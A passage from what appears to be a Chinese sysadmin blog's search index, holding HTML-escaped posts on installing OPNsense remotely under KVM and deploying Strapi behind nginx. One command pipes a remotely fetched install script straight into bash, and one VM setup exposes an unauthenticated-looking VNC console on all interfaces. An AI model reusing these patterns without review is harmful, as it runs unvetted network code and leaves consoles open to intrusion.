class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/iso/OPNsense-25.7-dvd-amd64.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0,model\u003cspan class=\"o\"\u003e=\u003c/span\u003evirtio \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr1,model\u003cspan class=\"o\"\u003e=\u003c/span\u003evirtio \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-type unix \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-variant freebsd13.1 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5901\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"三vnc连到port-5901上进行安装配置\"\u003e三、vnc连到port 5901上进行安装配置\u003c/h5\u003e\n\u003cp\u003eOPNsense公网的网卡、ip、mask、gateway配置\u003c/p\u003e\n\u003cp\u003eOPNsense内网的网卡、ip、mask配置\u003c/p\u003e\n\u003ch5 id=\"四设置内网访问\"\u003e四、设置内网访问\u003c/h5\u003e\n\u003cp\u003e这里就非常鬼畜了，首先在内网的那台机器上做port转发，这台机器是192.168.100.2，做个systemd的service:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/systemd/system/opn-proxy.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eUnit\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAfter\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWants\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eService\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWorkingDirectory\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eType\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esimple\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eExecStart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/usr/local/bin/go-tcp-proxy_1.0.2_linux_amd64 -l \u003cspan class=\"s2\"\u003e\u0026#34;:4430\u0026#34;\u003c/span\u003e -r \u003cspan class=\"s2\"\u003e\u0026#34;192.168.100.1:4430\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestart\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eon-failure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eRestartSec\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003eInstall\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eWantedBy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如上的话，如果web访问http://192.168.100.2:4430，那Host: 192.168.100.1 会被转发给 192.168.100.1 的OPNsense的4430端口\u003c/p\u003e\n\u003cp\u003e那OPNsense的内网IP是192.168.100.1，登录用户是root，密码是xxxxxxxx\u003c/p\u003e\n\u003cp\u003e从vnc上登录，然后进入shell，找到webgui的部分，添加port和althostnames的两项\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /conf/config.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;webgui\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;protocol\u0026gt;https\u0026lt;/protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;ssl-certref\u0026gt;68adc26101eeb\u0026lt;/ssl-certref\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;port\u0026gt;4430\u0026lt;/port\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;althostnames\u0026gt;192.168.100.2\u0026lt;/althostnames\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/webgui\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e......\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后重启webgui\u003c/p\u003e","title":"OPNsense的远程安装并访问WEBGUI"},{"content":"老实说，strapi的安装真的不是一件容易的事情。\n第一步想简单化，于是就用Docker compose来安装，结果并不容易，官方文档不可用，改了半天终于跑起来，然后，嘿嘿，dockerhub上的strapi:latest 早就过期很久了。\n于是又琢磨它那个Docker build版本的，问题是，都在宿主机环境build出来了，然后再放到Docker镜像中跑，岂不是脱裤子放屁，多此一举么。\n于是回到原点，需要在CLI环境下安装，然后要部署到正式生产环境。\n步骤如下：\n一、装mysql 8.0 apt install wget lsb-release gnupg -y wget https://dev.mysql.com/get/mysql-apt-config_0.8.29-1_all.deb dpkg -i mysql-apt-config_0.8.29-1_all.deb apt update apt install mysql-server 二、装NVM，nodejs和yarn curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh | bash source ~/.nvm/nvm.sh nvm ls-remote nvm install v20.19.5 node -v npm install -g yarn npm list -g 三、初始化strapi mkdir /data cd /data yarn create strapi # 我们要跳过它那个免费30天的grow方案 # 然后数据库是 mysql , 填入mysql的一系列参数 # 使用ts 四、配置strapi # 加入自己的域名 vi /data/strapi/config/server.ts export default ({ env }) =\u0026gt; ({ host: env(\u0026#39;HOST\u0026#39;, \u0026#39;0.0.0.0\u0026#39;), port: env.int(\u0026#39;PORT\u0026#39;, 1337), url: \u0026#39;https://blog.rendoumi.com\u0026#39;, app: { keys: env.array(\u0026#39;APP_KEYS\u0026#39;), }, }); # 建立新文件 vi /data/strapi/src/admin/vite.config.ts import { defineConfig, mergeConfig } from \u0026#39;vite\u0026#39;; export default (config) =\u0026gt; { return mergeConfig(config, defineConfig({ resolve: { alias: { \u0026#39;@\u0026#39;: \u0026#39;/src\u0026#39;, }, }, server: { allowedHosts: true } })); }; 五、安装nginx，运行程序 apt install nginx # 注释掉无用配置 vi /etc/nginx/nginx.conf # include /etc/nginx/sites-enabled/*; # 新增配置 vi /etc/nginx/conf.d/strapi.conf upstream strapi { server 127.0.0.1:1337; } server { # Listen HTTP listen 80; server_name blog.rendoumi.com; # Redirect HTTP to HTTPS return 301 https://$host$request_uri; } server { # Listen HTTPS listen 443 ssl; server_name webcms.yoov.com; # SSL config ssl_certificate /usr/local/bin/certs/certificates/blog.rendoumi.com.crt; ssl_certificate_key /usr/local/bin/certs/certificates/blog.rendoumi.com.key; # Proxy Config location / { proxy_pass http://strapi; proxy_http_version 1.1; proxy_set_header X-Forwarded-Host $host; proxy_set_header X-Forwarded-Server $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header Host $http_host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_pass_request_headers on; } } cd /data/strapi yarn develop 然后登录就可以了，诡异的是第四步，如果不gen vite.config.ts，那nginx代理访问local host:1337上会出问题。\n六、升级 yarn strapi version npx @strapi/upgrade latest ","permalink":"https://rendoumi.com/posts/20251016-strapi/","summary":"\u003cp\u003e老实说，strapi的安装真的不是一件容易的事情。\u003c/p\u003e\n\u003cp\u003e第一步想简单化，于是就用Docker compose来安装，结果并不容易，官方文档不可用，改了半天终于跑起来，然后，嘿嘿，dockerhub上的strapi:latest 早就过期很久了。\u003c/p\u003e\n\u003cp\u003e于是又琢磨它那个Docker build版本的，问题是，都在宿主机环境build出来了，然后再放到Docker镜像中跑，岂不是脱裤子放屁，多此一举么。\u003c/p\u003e\n\u003cp\u003e于是回到原点，需要在CLI环境下安装，然后要部署到正式生产环境。\u003c/p\u003e\n\u003cp\u003e步骤如下：\u003c/p\u003e\n\u003ch5 id=\"一装mysql-80\"\u003e一、装mysql 8.0\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install wget lsb-release gnupg -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://dev.mysql.com/get/mysql-apt-config_0.8.29-1_all.deb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edpkg -i mysql-apt-config_0.8.29-1_all.deb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install mysql-server\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"二装nvmnodejs和yarn\"\u003e二、装NVM，nodejs和yarn\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.4/install.sh \u003cspan class=\"p\"\u003e|\u003c/span\u003e bash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e ~/.nvm/nvm.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm ls-remote\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm install v20.19.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm install -g yarn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpm list -g\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"三初始化strapi\"\u003e三、初始化strapi\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir /data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyarn create strapi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 我们要跳过它那个免费30天的grow方案\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 然后数据库是 mysql , 填入mysql的一系列参数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 使用ts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"四配置strapi\"\u003e四、配置strapi\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 加入自己的域名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /data/strapi/config/server.ts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e default \u003cspan class=\"o\"\u003e({\u003c/span\u003e env \u003cspan class=\"o\"\u003e})\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e({\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  host: env\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;HOST\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;0.0.0.0\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  port: env.int\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;PORT\u0026#39;\u003c/span\u003e, 1337\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  url: \u003cspan class=\"s1\"\u003e\u0026#39;https://blog.rendoumi.com\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  app: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    keys: env.array\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;APP_KEYS\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 建立新文件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /data/strapi/src/admin/vite.config.ts\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport \u003cspan class=\"o\"\u003e{\u003c/span\u003e defineConfig, mergeConfig \u003cspan class=\"o\"\u003e}\u003c/span\u003e from \u003cspan class=\"s1\"\u003e\u0026#39;vite\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e default \u003cspan class=\"o\"\u003e(\u003c/span\u003econfig\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e mergeConfig\u003cspan class=\"o\"\u003e(\u003c/span\u003econfig, defineConfig\u003cspan class=\"o\"\u003e({\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    resolve: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      alias: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s1\"\u003e\u0026#39;@\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;/src\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      allowedHosts: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"五安装nginx运行程序\"\u003e五、安装nginx，运行程序\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 注释掉无用配置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/nginx/nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#        include /etc/nginx/sites-enabled/*;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 新增配置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/nginx/conf.d/strapi.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eupstream strapi \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server 127.0.0.1:1337\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Listen HTTP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen 80\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name blog.rendoumi.com\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Redirect HTTP to HTTPS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"m\"\u003e301\u003c/span\u003e https://\u003cspan class=\"nv\"\u003e$host$request_uri\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# Listen HTTPS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    listen \u003cspan class=\"m\"\u003e443\u003c/span\u003e ssl\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    server_name webcms.yoov.com\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# SSL config\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ssl_certificate 